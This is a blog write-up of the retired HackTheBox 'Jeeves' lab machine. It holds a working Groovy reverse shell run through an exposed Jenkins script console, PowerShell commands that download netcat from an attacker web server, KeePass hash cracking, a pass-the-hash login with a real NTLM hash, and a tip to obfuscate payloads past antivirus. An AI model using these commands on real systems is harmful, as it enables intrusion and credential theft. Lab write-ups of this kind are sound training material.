---
layout: post
title: "HackTheBox - Jeeves writeup"
subtitle: "~ Walkthrough of Jeeves machine from HackTheBox ~"
date: 2018-05-23
author: V3ded
category: CTF
tags: blog ctf pentesting hackthebox
finished: true
excerpt_separator: <!--more-->
---
<img src="/img/blog/htb-jeeves/htb-jeeves-00.png" width="417" height="136">
# Introduction
Jeeves is a medium rated machine on HackTheBox platform which got retired last weekend (18.05.2018). Core of this machine revolves around pwnage of Jenkins. Let's get to it. <!--more-->

***

# Scanning and Enumeration 
As usual, start out with **Nmap**:
```console
root@EdgeOfNight:~# nmap -sV -T4 -sS 10.10.10.63

Starting Nmap 7.60 ( https://nmap.org ) at 2018-05-22 18:24 BST
Nmap scan report for 10.10.10.63
Host is up (0.062s latency).
Not shown: 996 filtered ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.28 seconds
```

For the sake of keeping this blogpost short, I'll ignore enumeration of port 135 and 445 as they most likely aren't part of the overall solution. 

### - HTTP port 80
Upon visiting the HTTP server at port 80 we are presented with somewhat custom made search engine:

<a href="/img/blog/htb-jeeves/htb-jeeves-01.png" target="_blank"><img class="centerImgLarge" src="/img/blog/htb-jeeves/htb-jeeves-01.png"></a>

Afterwards, I run **Gobuster** to search for any hidden content or directories, but find none. Not much one can do from here on... A dead end!

### - HTTP Port 50000
Upon visiting the HTTP server at port 50000  we are presented with a 404 page:

<a href="/img/blog/htb-jeeves/htb-jeeves-02.png" target="_blank"><img class="centerImgSmall" src="/img/blog/htb-jeeves/htb-jeeves-02.png"></a>

Same approach using **Gobuster**.
```console
root@EdgeOfNight:~# gobuster -e -u http://10.10.10.63:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 25 

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.63:50000/
[+] Threads      : 25
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307
[+] Expanded     : true
=====================================================
http://10.10.10.63:50000/askjeeves (Status: 302)
```
Fortunately for us, `/askjeeves/` exposes an unprotected Jenkins install. 

<a href="/img/blog/htb-jeeves/htb-jeeves-03.png" target="_blank"><img class="centerImgLarge" src="/img/blog/htb-jeeves/htb-jeeves-03.png"></a>

This allows us to either upload a malicious .exe file through job creation or run custom commands in the Jenkins console. I chose the latter. If you however decide to stick with job creation, make sure that the files you upload are well obfuscated so that the antivirus doesn't delete them ;). I'd definitely recommend [VeilFramework](https://github.com/Veil-Framework/Veil){:target="_blank"} for this purpose.

***

# Exploitation
Navigate to the script console (*Manage Jenkins -> Script Console*), located at `http://10.10.10.63:50000/askjeeves/script`. 

<a href="/img/blog/htb-jeeves/htb-jeeves-03,5.png" target="_blank"><img class="centerImgHuge" src="/img/blog/htb-jeeves/htb-jeeves-03,5.png"></a>

This allows us to run arbitrary GroovyScript (similar to java) commands. Doing a bit of research, I find a GroovyScript reverse shell on [GitHub](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76){:target="_blank"}.

{% highlight java %}
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
{% endhighlight %}

If we rewrite the port and the host, we should be able to get a nice netcat reverse shell. 

<a href="/img/blog/htb-jeeves/htb-jeeves-04.png" target="_blank"><img class="centerImgMedium" src="/img/blog/htb-jeeves/htb-jeeves-04.png"></a>

Awesome! User's hash is located at `C:\Users\kohsuke\Desktop`. Go and get it! 

***

# Privilege escalation
Unfortunately, we still need to escalate our privileges in order to capture all the flags. There are two main methods of doing so - cracking of .kdbx file and token impersonation (*rotten potato method*). Below, the first method will be described. 

### - Keepas password manager
Doing a bit of roaming around the file system, I find an interesting .kdbx file. This file extension is associated with *Keepass password manager*. The mentiond .kdbx file can be found at `C:\Users\kohsuke\Documents\CEH.kdbx`. To transfer this file into our computer I first put **netcat** binary (in Kali: `/usr/share/windows-binaries/nc.exe`) onto the Windows system via Powershell:

{% highlight powershell %}
# Run inside the reverse shell: 
powershell -c '(new-object System.Net.WebClient).DownloadFile("http://IP/nc.exe", "C:\Windows\Temp\nc.exe")'
# OR
powershell -c 'Invoke-WebRequest "http://IP/nc.exe" -OutFile "C:\Windows\Temp\nc.exe"' 
{% endhighlight %}

> Note: Don't forget to start a web server before you actually try to download a file.

Thanks to **netcat**, we are able to transfer the .kdbx file into our filesystem. We can then proceed to generate a hash with **keepass2john**.
```console
root@EdgeOfNight:/tmp# keepass2john CEH.kdbx 
CEH:$keepass$*2*6000*222*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
``` 

This hash can be then cracked with usual programs like **Hashcat** or **JohnTheRipper**.
```console
root@EdgeOfNight:/tmp# john --format="keepass" --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64 OpenSSL])
Press 'q' or Ctrl-C to abort, almost any other key for status
moonshine1       (CEH)
1g 0:00:01:12 DONE (2018-05-22 19:56) 0.01371g/s 754.2p/s 754.2c/s 754.2C/s moonshine1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

The master password of the Keepass manager is `moonshine1`! By installing Keepass2 (*apt-get install keepass2*), we can view the .kdbx file and see all saved up passwords.
The preview looks like this:

<a href="/img/blog/htb-jeeves/htb-jeeves-05.png" target="_blank"><img class="centerImgLarge" src="/img/blog/htb-jeeves/htb-jeeves-05.png"></a>

None of these passwords are actually usable apart from *Backup stuff*.  

<a href="/img/blog/htb-jeeves/htb-jeeves-06.png" target="_blank"><img class="centerImgSmall" src="/img/blog/htb-jeeves/htb-jeeves-06.png"></a>

Does that password look familiar? Yup! It is an NTLM hash which we can use for pass the hash attack! Both Metasploit's **psexec** module or **pth-winexe** can be used. 
```console
root@EdgeOfNight:~# pth-winexe -U ./Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd.exe
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
jeeves\administrator

```

Normally I'd end the blog here as we gained root / administrator privileges. However, retrieving the root flag is a bit tricky. This is the part where most people get frustrated, because normal directory listing doesn't yield any useful results. The flag itself is hidden inside an alternate data stream. Alternate data streams can be listed with `dir /r`:

<a href="/img/blog/htb-jeeves/htb-jeeves-07.png" target="_blank"><img class="centerImgMedium" src="/img/blog/htb-jeeves/htb-jeeves-07.png"></a>

and viewed with `more < hm.txt:root.txt`:

<a href="/img/blog/htb-jeeves/htb-jeeves-08.png" target="_blank"><img class="centerImgMedium" src="/img/blog/htb-jeeves/htb-jeeves-08.png"></a>

***

# Conclusion
Congratulations! At this point there's nothing left - both flags have been retrieved. If you want to view alternative methods which I didn't show (such as rotten potato), I'd highly recommend Ippsec's [video](https://www.youtube.com/watch?v=EKGBskG8APc){:target="_blank"}. His content is great and I often learn many new methods from his tutorials :-) ! Thanks for reading.

~V3
